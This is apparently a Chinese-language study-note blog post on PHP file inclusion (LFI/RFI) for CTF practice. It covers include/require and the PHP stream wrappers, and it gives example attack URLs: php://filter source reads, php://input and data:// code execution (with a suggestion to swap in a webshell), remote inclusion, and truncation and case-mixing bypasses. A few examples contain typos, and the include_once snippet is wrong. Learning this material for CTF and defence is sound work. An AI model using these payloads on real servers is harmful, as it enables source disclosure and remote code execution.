---
title: 文件包含
date: 2023-10-17T13:08:52+08:00
slug: 64b97cd
tags:
  - LEARN
  - PHP
categories:
  - DIG
  - LEARN
---

# 文件包含漏洞

  

PHP version

  

## 包含函数

- include

- require

- include_once

- require_once

  

<!-- more -->

  

### include

>将指定的文件载入并执行里面的程序。重复引用的情况下加载多次。

  

```php

<?php

    include "test.php";

    include "test.php";

?>

```

包含两次test.php。

  

### include_once

>将指定文件载入并执行内含程序。不会重复包含。

```php

<?php

    include "test.php";

    include "test.php";

?>

```

包含一次test.php。

  

### require

>除了处理错误的方式不同外，其他方面相同。同时require()一般放在 PHP 文件的最前面，程序在执行前就会先导入要引用的文件；include()一般放在程序的流程控制中，当程序执行时碰到才会引用，简化程序的执行流程

  

- require生成致命错误(E_COMPILE_ERROE)，脚本停止。

- include生成警告(E_WARNING)，脚本继续。

  

require_once()也类似。

  

## 封装协议

  

|协议|作用|

|---|---|

|file://|访问本地文件系统|

|http(s)||

|ftp://|访问FTP(s) URL|

|php://|访问各个输入/出流|

|zlib://|压缩流|

|data://|数据|

|phar://|PHP归档|

...

  

### 伪协议

  

>file://

  

#### 条件：

- `allow_url_fopen`:off/on

- `allow_url_include`:off/on

  

#### 作用

用于访问本地文件系统。include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。

  

#### usage

- 绝对路径

`http://xxx/include.php?file=file://C:\WWW\test\1.txt`

  

- 相对路径

`http://xxx/include.php?file=./2.txt`

  

- 网络路径

`http://xxx/include.php?file=http://yyy/3.txt`

  
  

>php://

  

#### 条件：

- `allow_url_fopen`:off/on

- `allow_url_include`:仅php://input, php://stdin, php://memory, php://temp需要on

  

#### 作用

- `php://` 访问各个输入/输出流（I/O streams）

  - 在CTF中经常使用的是`php://filter`和

  - `php://input`，`php://filter`用于读取源码，

  - `php://input`用于执行php代码。

  
  

>php://filter

  

#### 作用

一种元封装器，设计用于数据流打开时的筛选过滤应用。对于如`readfile()`，`file()`，`fiel_get_contents()`等一体式的文件函数非常有用，在数据流内容读取之前没有机会应用其他过滤器。

  

#### 参数&过滤器

**参数**：

- `resource=`： 必须项，指定了需要筛选过滤的数据流。

- `read-`: 可选项，设定一个或多个过滤器名称，以管道符`(*\*)`分隔。

- `write=`: 可选，设定一个或多个过滤器名称，以管道符`(\)`分隔。

- `;`：任何没有以`read=`或者`write=`做前缀的筛选器列表会视情况应用于读或写链。

  

**过滤器**

  

- 字符过滤器

|过滤器名称|作用|

|---|---|

|`string.rot13`|=`str_rot13()`，rot13变换|

|`string.toupper`|=`strtoupper`，转大写字母|

|`string.tolower`|`strtolower()`，转小写|

|`string.strip_tags`|`strip_tags()`，去除html、PHP语言标签|

  

- 转换过滤器

|过滤器名称|作用|

|---|---|

|`convert.base64-encode & convert.base64-decode`|=`base64_encode()/base64_decode()`，base64编码/解码|

|`convert.quoted-printable-encode & convert.quoted-printable-decode`|quoted-printable字符串与8-bit字符串编码/解码|

  

- 压缩过滤器

  

|过滤器名称|作用|

|---|---|

|`zlib.deflate & zlib.inflate`|在本地文件系统中创建gzip兼容文件的方法，但不产生命令行工具，只是压缩和解压数据流中的有效载荷部分|

|`bzip2.compress & bzip2.decompress`|在本地文件系统中创建bz2兼容文件方法|

  
  

- 加密过滤器

|过滤器名称|作用|

|---|---|

|`mcrypt.*`|libmcrypt 对称加密算法|

|`mdecrypt.*`|libmcrypt 对称解密算法|

  
  

## 示例

  

### php://filter

  

1.读取文件源码（对php文件需要base64编码）

```url

http://xxx/include.php?filr=php://filter/read=covert.base64-encode/resource=xxx

```

  

2.执行php代码（结合post data）

```url

http://xxx/include.php?file=php://input

使用hackbar或者其他的进行post data的输入

[post data]一般是php代码，一句话木马version

```

  

### zip://、bzip2://、zlib://

>访问压缩文件中的子文件，不需要指定后缀名，也可以随意修改后缀名。

  

1.压缩文件且修改后缀then上传

```txt

http://xxx/include.php?file=zip://E:\WWW\phpinfo.jpg%23phpinfo.txt

压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传

  

http://xxx/include.php?file=compress.bzip2://E:\WWW\phpinfo.bz2

压缩 phpinfo.txt 为 phpinfo.bz2 并上传

  

http://xxx/include.php?file=compress.zlib://E:\WWW\phpinfo.gz

压缩 phpinfo.txt 为 phpinfo.gz 并上传

```

  

### data://

  

```txt

http://xxx/include.php?file=data://text/plain,<?php%20phpinfo();?>

<yyy>内容可以替换为其他php木马

  

http://xxx/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

  

```

  

## 过滤绕过

<h2>(LFI version)</h2>

  

### 1.%00截断(RFI & LFI)

>在低版本中php读取文件名时认为%00是终止符，对于%00后面的内容就会失效。

### 2.路径长度截断

>Windows下目录最大长度为256字节，超出的部分会被丢弃；

Linux下目录最大长度为4096字节，超出的部分会被丢弃。

### 3.点号截断

>windows系统点号长于256，超出的部分会被丢弃；

linux系统点号长于4096，超出的部分会被丢弃；

### 4.双写绕过

举例：

`pphhpp://input`

### 5.大小写混合绕过

举例：

`Php://input`

  

### 6.伪协议绕过

前面说的那些

  

<h2>(RFI version)</h2>

  

### 问号绕过

```txt

1.txt

content: <?php phpinfo();?>

在远端服务器网站目录中

  

访问时出现1.txt.php报错，所以修改访问URL为http://xxx/1.txt?

就会执行内容php代码

  

```

后面几个也都是在文件末尾添加

### %23绕过

  
  

## 参考

  

<a href=https://segmentfault.com/a/1190000018991087>PHP伪协议总结</a>
